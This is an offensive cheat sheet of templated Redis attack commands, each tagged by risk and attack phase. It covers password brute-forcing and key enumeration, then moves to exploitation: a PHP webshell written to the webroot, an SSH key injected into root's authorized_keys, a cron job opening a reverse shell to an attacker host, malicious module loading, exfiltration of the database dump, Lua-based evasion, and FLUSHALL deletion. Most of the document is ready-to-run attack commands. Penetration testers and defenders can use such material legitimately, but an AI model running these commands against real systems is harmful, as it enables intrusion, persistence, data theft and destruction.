# Redis
> In-memory key-value store enumeration, file write exploitation, and persistence
<!-- tags: redis,database,key-value,enumeration,exploit -->

---

## connect authenticated
Connect to remote Redis instance with optional password.

```bash
redis-cli -h {{TARGET:ip}} -p {{PORT:port:6379}} -a {{PASSWORD:str}}
```

<!-- meta: risk=low | phase=enum | tags=redis,connect -->

---

## probe info unauthenticated
Test for unauthenticated Redis instance.

```bash
redis-cli -h {{TARGET:ip}} -p {{PORT:port:6379}} INFO
```

<!-- meta: risk=safe | phase=recon | tags=redis,unauth,info -->

---

## brute password hydra
Use Hydra to crack Redis password.

```bash
hydra -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} redis://{{TARGET:ip}}:{{PORT:port:6379}}
```

<!-- meta: risk=high | phase=passwords | tags=redis,bruteforce,hydra -->

---

## list all keys
Enumerate every key in the database (slow on large DBs).

```bash
redis-cli -h {{TARGET:ip}} KEYS '*'
```

<!-- meta: risk=low | phase=enum | tags=redis,keys -->

---

## scan keys iterative
Iterate keys with optional pattern (use on large datasets).

```bash
redis-cli -h {{TARGET:ip}} SCAN 0 MATCH '{{PATTERN:str:*}}' COUNT 100
```

<!-- meta: risk=low | phase=enum | tags=redis,scan,keys -->

---

## get key value
Retrieve value stored at a specific key.

```bash
redis-cli -h {{TARGET:ip}} GET {{KEY:str}}
```

<!-- meta: risk=low | phase=enum | tags=redis,get,value -->

---

## search keys sensitive strings
Find keys with names containing password/token/secret.

```bash
redis-cli -h {{TARGET:ip}} KEYS '*' | grep -iE 'pass|token|secret|api'
```

<!-- meta: risk=low | phase=enum | tags=redis,search,sensitive -->

---

## dump config
Inspect full Redis configuration for misconfigurations.

```bash
redis-cli -h {{TARGET:ip}} CONFIG GET '*'
```

<!-- meta: risk=safe | phase=enum | tags=redis,config -->

---

## switch database index
Switch to a different Redis logical database (0-15).

```bash
redis-cli -h {{TARGET:ip}} -n {{DB_INDEX:int:1}}
```

<!-- meta: risk=low | phase=enum | tags=redis,db-index -->

---

## write webshell config set
Write a PHP webshell to webroot via Redis dbfilename.

```bash
redis-cli -h {{TARGET:ip}} CONFIG SET dir /var/www/html/
redis-cli -h {{TARGET:ip}} CONFIG SET dbfilename shell.php
echo -en "<?php system(\$_GET['c']); ?>" | redis-cli -h {{TARGET:ip}} -x SET payload
redis-cli -h {{TARGET:ip}} SAVE
```

<!-- meta: risk=critical | phase=exploit | tags=redis,webshell,file-write,rce -->

---

## inject ssh key root privesc
Inject SSH public key into authorized_keys via Redis.

```bash
echo -e "\n\n\n$(cat ~/.ssh/id_rsa.pub)\n\n\n" | redis-cli -h {{TARGET:ip}} -x SET sshkey
redis-cli -h {{TARGET:ip}} CONFIG SET dir /root/.ssh/
redis-cli -h {{TARGET:ip}} CONFIG SET dbfilename authorized_keys
redis-cli -h {{TARGET:ip}} SAVE
```

<!-- meta: risk=critical | phase=exploit | tags=redis,ssh-key,privesc -->

---

## write cron job persistence
Write a malicious cron job for persistent reverse shell.

```bash
redis-cli -h {{TARGET:ip}} CONFIG SET dir /etc/cron.d/
redis-cli -h {{TARGET:ip}} CONFIG SET dbfilename cronjob
echo -en "\n\n*/1 * * * * root bash -i >& /dev/tcp/{{LHOST:ip}}/{{LPORT:port:4444}} 0>&1\n\n" | redis-cli -h {{TARGET:ip}} -x SET payload
redis-cli -h {{TARGET:ip}} SAVE
```

<!-- meta: risk=critical | phase=post | tags=redis,persistence,cron -->

---

## load module rce
Load malicious Redis module for persistent code execution (Redis 4.0+).

```bash
redis-cli -h {{TARGET:ip}} CONFIG SET dir /tmp/
redis-cli -h {{TARGET:ip}} CONFIG SET dbfilename payload.so
redis-cli -h {{TARGET:ip}} SAVE
redis-cli -h {{TARGET:ip}} MODULE LOAD /tmp/payload.so
```

<!-- meta: risk=critical | phase=exploit | tags=redis,module,rce -->

---

## dump rdb bgsave exfil
Trigger BGSAVE then download dump.rdb for offline analysis.

```bash
redis-cli -h {{TARGET:ip}} CONFIG GET dir
redis-cli -h {{TARGET:ip}} BGSAVE
scp {{USERNAME:str}}@{{TARGET:ip}}:/var/lib/redis/dump.rdb {{OUTFILE:file:dump.rdb}}
rdb --command json {{OUTFILE:file:dump.rdb}}
```

<!-- meta: risk=high | phase=post | tags=redis,bgsave,exfil -->

---

## monitor live commands
Capture real-time commands executed against Redis.

```bash
redis-cli -h {{TARGET:ip}} MONITOR
```

<!-- meta: risk=med | phase=post | tags=redis,monitor,sniffing -->

---

## eval lua evasion
Execute commands via Lua scripting (often less monitored).

```bash
redis-cli -h {{TARGET:ip}} --eval 'return redis.call("SET",KEYS[1],ARGV[1])' {{KEY:str}} , {{VALUE:str}}
```

<!-- meta: risk=med | phase=exploit | tags=redis,lua,evasion -->

---

## flush all data
Delete all keys in all databases (destructive).

```bash
redis-cli -h {{TARGET:ip}} FLUSHALL
```

<!-- meta: risk=critical | phase=post | tags=redis,destructive,flush -->
